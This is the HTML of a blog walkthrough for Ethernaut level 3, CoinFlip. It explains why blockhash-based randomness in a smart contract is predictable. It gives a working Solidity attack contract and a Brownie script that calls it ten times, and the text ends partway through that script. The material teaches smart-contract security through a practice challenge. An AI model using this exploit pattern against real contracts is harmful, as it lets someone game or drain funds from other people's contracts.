@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    Ethernaut - Level 03 - Coinflip - Security Pills
+  </title>
+
+  <meta name="description" content="Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block." /><meta name="generator" content="Hugo 0.101.0" />
+
+  <link rel="stylesheet" href="https://securitypills.github.io/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="Ethernaut - Level 03 - Coinflip" />
+<meta property="og:description" content="Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://securitypills.github.io/articles/ethernaut-3-coinflip/" /><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2022-08-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-11T00:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ethernaut - Level 03 - Coinflip"/>
+<meta name="twitter:description" content="Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block."/>
+
+
+  <meta itemprop="name" content="Ethernaut - Level 03 - Coinflip">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block."><meta itemprop="datePublished" content="2022-08-11T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-11T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1266">
+<meta itemprop="keywords" content="" />
+
+  <meta itemprop="name" content="Ethernaut - Level 03 - Coinflip">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block."><meta itemprop="datePublished" content="2022-08-11T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-11T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1266">
+<meta itemprop="keywords" content="" />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button
+      aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://securitypills.github.io/" class="px-2">
+    <span>Security Pills</span>
+    
+    </a>
+    
+    <button
+      aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span>Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles" >
+        <span>Blog</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/portfolio" >
+        <span>Newsletter</span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  <div class="revue-widget">
+  <form action="https://embeds.beehiiv.com/3645f86f-e3bb-46cb-adec-b3b2f20c9411?slim=true" method="post" name="revue-form" target="_blank">
+    <div class="text-bold text-sm">Subscribe to my newsletter</div>
+    
+    <p class="text-xs my-1 text-slate-500">A weekly newsletter for smart and curious people interested in security, technology, and smartcontracts</p>
+    
+    <div class="mt-2">
+      <input type="email" class="w-full px-1.5 py-0.5 text-sm rounded border dark:border-slate-700 dark:bg-slate-600" name="member[email]" id="member_email" placeholder="Your email address...">
+      <input type="submit" class="mt-2 w-full text-center text-sm bg-slate-800 text-white dark:bg-slate-50 dark:text-slate-800 py-1 rounded" name="member[subscribe]" id="member_submit" value="Subscribe">
+    </div>
+  </form>
+</div>
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button
+  aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button><div class="flex-1">
+
+
+
+<div class="flex h-screen relative">
+
+  <section
+    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
+  lg:translate-x-0 lg:min-w-[400px] lg:w-1/4 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area">
+    
+    
+    <a href="https://securitypills.github.io/articles/">
+      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Articles</h2>
+    </a>
+    <div class="space-y-2.5">
+      
+      <a class="block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
+        href="/articles/ethernaut-3-coinflip/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 03 - Coinflip</h3>
+        <div
+          class="text-sm  text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut Challenges</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Please read This is a work in progress article that will receive updates as we continue publishing detailed walkthroughs for each level.
+Ethernaut is OpenZeppelin Web3/Solidity based wargame to learn about Ethereum smart contract security and become familiar with programming principles in Solidity.
+Although the game was launched few years ago it has become a good place to start for those who are interested on security and smart contracts.
+Challenges are currently running on the Rinkeby testnet and you will require to use a Rinkey Faucet to get free testnet ETH and test the smart contracts.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut-1-fallback/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 01 - Fallback</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut-2-fallout/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 02 - Fallout</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg.
+        </div>
+      </a>
+      </div>
+    </section>
+
+  <div class="overflow-y-auto h-screen w-full">
+    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">
+
+      
+      <h1 class="!mb-2">Ethernaut - Level 03 - Coinflip</h1>
+      
+      <p class="text-sm text-slate-500 !mb-8">August 11, 2022</p>
+      
+
+      
+
+      <figure><img src="../images/coinflip-3.svg"
+         alt="Image courtesy of OpenZeppelin"/><figcaption>
+            <p>Image courtesy of OpenZeppelin</p>
+        </figcaption>
+</figure>
+
+<h2 id="ethernaut-03---coinflip">Ethernaut 03 - Coinflip</h2>
+<p>The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> consecutiveWins;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> lastHash;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number.sub(<span style="color:#ae81ff">1</span>)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {
+</span></span><span style="display:flex;"><span>      revert();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lastHash <span style="color:#f92672">=</span> blockValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue.div(FACTOR);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (side <span style="color:#f92672">==</span> _guess) {
+</span></span><span style="display:flex;"><span>      consecutiveWins<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This level illustrates one of the most serious pitfalls in the smart contracts, the generation of pseudo-random numbers.</p>
+<p>According to <a href="https://blog.chain.link/random-number-generation-solidity/"  target="_blank" rel="noopener" >Chainlink</a>:</p>
+<blockquote>
+<p>Random number generation (RNG) in solidity must be done by sending a seed to an off-chain resource like an <a href="https://chain.link/education/blockchain-oracles"  target="_blank" rel="noopener" >oracle</a>, which must then return the generated random number and verifiable proof back to the smart contract.  Random numbers cannot be generated natively in Solidity due to the determinism of blockchains.</p>
+</blockquote>
+<p>Unfortunately, developers currently attempt to create pseudo-randomness in Ethereum by hashing variables that are unique or difficult to tamper with, such as <code>block height</code>, <code>sender address</code> or <code>transaction timestamp</code>. Ethereum also offers two main cryptographic hashing functions, SHA-3 and <a href="https://keccak.team/keccak_specs_summary.html"  target="_blank" rel="noopener" >KECCAK256</a>, which hash the result of concatenating the variables mentioned before.</p>
+<p>Notwithstanding, using custom implementations to calculate pseudo-random numbers (our case with this contract)  in smart contracts makes them vulnerable to attacks. Attackers who know the input, can revert the process and guess the outcome and that is exactly what occurs with this contract.</p>
+<h2 id="where-is-the-vulnerability">Where is the vulnerability?</h2>
+<p>The contract has a flaw with its flipping algorithm, specifically with the use of <code>block.number</code> and <code>blockhash</code> as a form of randomness. According to Solidity official documentation:</p>
+<blockquote>
+<p>The timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money.</p>
+</blockquote>
+<p>In this particular level, a malicious user can calculate the correct answer if they run the same algorithm in their attack function before calling the contract’s <code>flip</code> function.</p>
+<h2 id="hacking-the-contract">Hacking the contract</h2>
+<p>Once again, let’s use brownie to solve this challenge by creating a malicious contract that mimics the original contract with some minor differences:</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">//SDPX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;./safemath.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Import the interface for the original CoinFlip contract
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// so we can invoke the flip method from this contract
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;interfaces/coinflipInterface.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlipAttack</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// CoinFlip interface&#39;s object;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CoinFlipInterface coinflipContract;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Constructor will initialize the coinflipContract object using the target&#39;s address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// See attack.py to see how this constructor is called.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> _address) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        coinflipContract <span style="color:#f92672">=</span> CoinFlipInterface(_address);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Function that recreates the contract&#39;s logic and pass the expected value
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#75715e">// Calculate the expected value based on block.number and blockhash
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number.sub(<span style="color:#ae81ff">1</span>)));
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#66d9ef">uint256</span> coinFlip <span style="color:#f92672">=</span> blockValue.div(FACTOR);
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#66d9ef">bool</span> side <span style="color:#f92672">=</span> coinFlip <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex; background-color:#3c3d38"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#75715e">// Pass the expected value to the original contract&#39;s flip method
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">bool</span> result <span style="color:#f92672">=</span> coinflipContract.flip(side);
+</span></span><span style="display:flex; background-color:#3c3d38"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        <span style="color:#75715e">// Continue only if we have provided the right value. We know this must be
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// true if the value passed is right, otherwise it will be false
+</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>        require(result);
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Destructor
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        selfdestruct(msg.sender);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The idea behind this malicious contract is to obtain the pseudo-random value before the original contract is called, and provide the expected value as parameter to the original <code>flip</code> method, then eval if our guess has been correct.</p>
+<p>Our project will also have two different interfaces, one for the original contract (<code>coinflipInterface.sol</code>) and an additional one for our malicious contract (<code>coinflipAttackInterface.sol</code>).</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">CoinFlipAttackInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">external</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>() <span style="color:#66d9ef">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">CoinFlipInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>These interfaces define which methods can be called from another contract, and we will use this in our <code>attack.py</code> script, which looks as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">from</span> brownie <span style="color:#f92672">import</span> accounts, config, <span style="color:#66d9ef">interface</span>, web3, CoinFlip, CoinFlipAttack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def attack(target, hacker)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39; </span>
+</span></span><span style="display:flex;"><span>    We will deploy our attack <span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">passing</span> the <span style="color:#66d9ef">constructor</span> arguments,
+</span></span><span style="display:flex;"><span>    and a dictionary <span style="color:#66d9ef">of</span> transaction parameters <span style="color:#66d9ef">as</span> the <span style="color:#66d9ef">final</span> argument, including
+</span></span><span style="display:flex;"><span>    a <span style="color:#66d9ef">from</span> value that specifies the Account to deploy the <span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">from</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39; </span>
+</span></span><span style="display:flex;"><span>    deploy_attack <span style="color:#f92672">=</span> CoinFlipAttack.deploy(target, {<span style="color:#e6db74">&#34;from&#34;</span><span style="color:#f92672">:</span> hacker})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    Create object <span style="color:#66d9ef">from</span> an arbitrary <span style="color:#66d9ef">address</span> <span style="color:#f92672">using</span> the Accounts.at method
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    coinflip <span style="color:#f92672">=</span> CoinFlip.at(target)
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#39;Address originating the attack:  {deploy_attack.address}&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> Execute <span style="color:#ae81ff">10</span> times the hack attack
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#66d9ef">in</span> range (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        deploy_attack.attack({<span style="color:#e6db74">&#39;from&#39;</span><span style="color:#f92672">:</span> hacker, <span style="color:#e6db74">&#39;gas_limit&#39;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">250000</span>, <span style="color:#e6db74">&#39;allow_revert&#39;</span><span style="color:#f92672">:</span> True})
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#39;Number:  {coinflip.consecutiveWins()}&#39;</span>)
+</span></span><span style="display:flex;"><span>    deploy_attack.destroy({<span style="color:#e6db74">&#39;from&#39;</span><span style="color:#f92672">:</span> hacker})
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>def main(target)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    hacker <span style="color:#f92672">=</span> accounts.add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
